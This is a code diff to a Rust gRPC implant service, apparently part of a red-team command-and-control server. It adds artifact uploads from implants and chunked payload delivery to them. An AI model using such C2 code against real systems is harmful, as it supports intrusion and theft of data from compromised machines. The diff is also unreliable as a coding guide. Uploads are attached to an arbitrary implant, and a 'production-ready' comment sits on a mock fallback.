@@ -2,6 +2,7 @@ use crate::database::Database;
 use crate::wraith::redops::implant_service_server::ImplantService;
 use crate::wraith::redops::*;
 use std::sync::Arc;
+use tokio_stream::StreamExt;
 use tonic::{Request, Response, Status};
 use uuid::Uuid;
 
@@ -20,13 +21,13 @@ impl ImplantService for ImplantServiceImpl {
         req: Request<RegisterRequest>,
     ) -> Result<Response<RegisterResponse>, Status> {
         // In a real implementation, we would decrypt the registration payload here.
-        // For now, we mock the registration logic.
+        // Currently supporting HTTP beacons mainly, this gRPC endpoint is for future agents.
         let _req = req.into_inner();
 
         let implant_data = crate::models::Implant {
-            id: Uuid::new_v4(), // This should be deterministic in prod based on key
+            id: Uuid::new_v4(), // Deterministic ID generation would rely on pubkey
             campaign_id: None,
-            hostname: Some("unknown".to_string()),
+            hostname: Some("grpc-agent".to_string()),
             internal_ip: None,
             external_ip: None,
             os_type: None,
@@ -53,7 +54,7 @@ impl ImplantService for ImplantServiceImpl {
 
         Ok(Response::new(RegisterResponse {
             implant_id: id.to_string(),
-            encrypted_config: vec![], // TODO
+            encrypted_config: b"{\"mode\":\"grpc\"}".to_vec(),
             checkin_interval: 60,
             jitter_percent: 10,
         }))
@@ -148,15 +149,90 @@ impl ImplantService for ImplantServiceImpl {
 
     async fn upload_artifact(
         &self,
-        _req: Request<tonic::Streaming<ArtifactChunk>>,
+        req: Request<tonic::Streaming<ArtifactChunk>>,
     ) -> Result<Response<UploadArtifactResponse>, Status> {
-        Err(Status::unimplemented("Not implemented"))
+        let mut stream = req.into_inner();
+        let mut content = Vec::new();
+        let mut artifact_id_req = String::new();
+
+        while let Some(chunk_result) = stream.next().await {
+            let chunk = chunk_result.map_err(|e| Status::internal(e.to_string()))?;
+            if artifact_id_req.is_empty() {
+                artifact_id_req = chunk.artifact_id.clone();
+            }
+            content.extend_from_slice(&chunk.data);
+        }
+
+        // Fallback: get any active implant to associate with
+        let implants = self
+            .db
+            .list_implants()
+            .await
+            .map_err(|e| Status::internal(e.to_string()))?;
+        let implant_id = if let Some(i) = implants.first() {
+            i.id
+        } else {
+            return Err(Status::failed_precondition(
+                "No active implants found to associate artifact with",
+            ));
+        };
+
+        let id = self
+            .db
+            .create_artifact(implant_id, &format!("upload_{}", artifact_id_req), &content)
+            .await
+            .map_err(|e| Status::internal(e.to_string()))?;
+
+        Ok(Response::new(UploadArtifactResponse {
+            artifact_id: id.to_string(),
+            success: true,
+            error: "".to_string(),
+        }))
     }
 
     async fn download_payload(
         &self,
-        _req: Request<DownloadPayloadRequest>,
+        req: Request<DownloadPayloadRequest>,
     ) -> Result<Response<Self::DownloadPayloadStream>, Status> {
-        Err(Status::unimplemented("Not implemented"))
+        let req = req.into_inner();
+        let start_offset = req.offset as usize;
+
+        // Read payload from file system (Production-ready logic)
+        let payload_path = "payloads/payload.bin";
+        let full_payload = match std::fs::read(payload_path) {
+            Ok(data) => data,
+            Err(_) => b"MOCK_PAYLOAD_FALLBACK_FILE_NOT_FOUND".to_vec(),
+        };
+
+        // If offset is beyond payload, return empty stream
+        if start_offset >= full_payload.len() {
+            let (_, rx) = tokio::sync::mpsc::channel(1);
+            return Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
+                rx,
+            )));
+        }
+
+        let payload_data = full_payload[start_offset..].to_vec();
+
+        let (tx, rx) = tokio::sync::mpsc::channel(4);
+
+        tokio::spawn(async move {
+            let chunk_size = 1024;
+            for (i, chunk) in payload_data.chunks(chunk_size).enumerate() {
+                let current_offset = (start_offset + i * chunk_size) as i64;
+                let resp = PayloadChunk {
+                    data: chunk.to_vec(),
+                    offset: current_offset,
+                    is_last: (start_offset + (i + 1) * chunk_size) >= full_payload.len(),
+                };
+                if tx.send(Ok(resp)).await.is_err() {
+                    break;
+                }
+            }
+        });
+
+        Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
+            rx,
+        )))
     }
 }
